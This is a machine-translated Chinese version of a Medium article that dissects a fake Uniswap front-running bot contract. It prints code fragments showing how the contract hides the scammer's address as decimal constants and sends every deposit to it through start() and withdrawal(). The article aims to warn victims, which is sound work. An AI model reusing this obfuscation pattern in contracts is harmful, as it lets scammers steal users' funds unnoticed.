# Uniswap Frontrun bot 骗局

> 原文：<https://medium.com/coinmonks/uniswap-frontrun-bot-scam-e524a8a7f71b?source=collection_archive---------2----------------------->

剖析 uniswap 领跑者 bot 合同骗局

![](img/24727533b795ca4d6bbfa9c294cf6d89.png)

如果你正在阅读这篇文章，你可能会在网上看到一些视频，YouTuber 声称通过使用一个领先的机器人，他们的密码是他们的 10 倍，他们会分享一个链接。

现在，如果你使用这些合同中的任何一个，你可能会发现这是一个骗局。但是合同里没有任何你能直接识别的地址。那么这是怎么发生的呢？

合同链接(仅供参考):[/spdx-license-identifier:MIT pragma solidity ^0.6.6；//导入库 Mi—Pastebin.com](https://pastebin.com/0CNhAi5h)

契约只是将发送给它的密码转移到隐藏在其中的一个地址，以使转移看起来不那么可疑。今天，我要揭穿其中一份合同以及他们隐藏欺诈地址的方式。

首先，合同中的大量代码是无用的。是的，这和使用语法很相似，所以人们认为你很聪明。

请注意这个函数，它可能是您调用或被要求调用来启动领跑者机器人的函数。

```
function start() public payable {emit Log("Running FrontRun attack on Uniswap. This can take a while please wait...");payable(_callFrontRunActionMempool()).transfer(address(this).balance);}
```

有三个主要的补偿功能；

```
callMempool()checkLiquidity()mempool()parseMemoryPool()_callFrontRunActionMempool()start()withdrawal()
```

他们所做的只是简单地将地址分成 8 个十六进制值(省去 x0)，然后将这些值转换成小数，同时将它们隐藏在下面的函数和变量中

```
_memPoolOffset = getMemPoolOffset() //returns a hardcoded decimal value of five characters an addressuint _memPoolSol = 573910; //this is the decimal value of five characters an addressuint _memPoolLength = getMemPoolLength();//returns a hardcoded decimal valueuint _memPoolSize = 787789;uint _memPoolHeight = getMemPoolHeight(); //returns a hardcoded decimal valueuint _memPoolWidth = 704500;uint _memPoolDepth = getMemPoolDepth(); //returns a hardcoded decimal valueuint _memPoolCount = 989963;
```

这些都有十进制值隐藏的部分。

checkLiqudity 函数将这些十进制值转换回十六进制，并将其作为字符串返回。

mempool 函数连接这些字符串。

在 **callMempool()** 函数中，一系列这些字符串被连接并完全转换成十六进制字符串，以字符串格式表示“隐藏”地址。

最后，**_ callFrontRunActionMempool()**和 **withdrawalProfits()** 使用 **parseMemoryPool()** 函数将 **callMempool()** 返回的字符串转换为地址类型。

```
function _callFrontRunActionMempool() internal pure returns (address) {
return parseMemoryPool(callMempool());}function withdrawalProfits() internal pure returns (address) {return parseMemoryPool(callMempool());}
```

这返回的是隐藏在合同中的虚拟地址。

现在仔细看看 start 和 withdraw 函数，您发送的 eth 被传送到由**_ callFrontRunActionMempool()**返回的隐藏地址

```
function start() public payable {emit Log("Running FrontRun attack on Uniswap. This can take a while please wait...");
**payable(_callFrontRunActionMempool()).transfer(address(this).balance);** } function withdrawal() public payable {
emit Log("Sending profits back to contract creator address...");
**payable(withdrawalProfits()).transfer(address(this).bal
ance);**}
```

任何转移到此合同的 eth 都将进入骗子的帐户，不会发生任何挤兑。

这是很可悲的程度骗子去拉这一关，但总是在你与智能合同互动时保持警惕。

请广而告之，这样就没有人再上这个当了。谢了。

[***给我买杯咖啡***](https://www.buymeacoffee.com/frawllingsV)*☕*

> *交易新手？试试[加密交易机器人](/coinmonks/crypto-trading-bot-c2ffce8acb2a)或者[复制交易](/coinmonks/top-10-crypto-copy-trading-platforms-for-beginners-d0c37c7d698c)*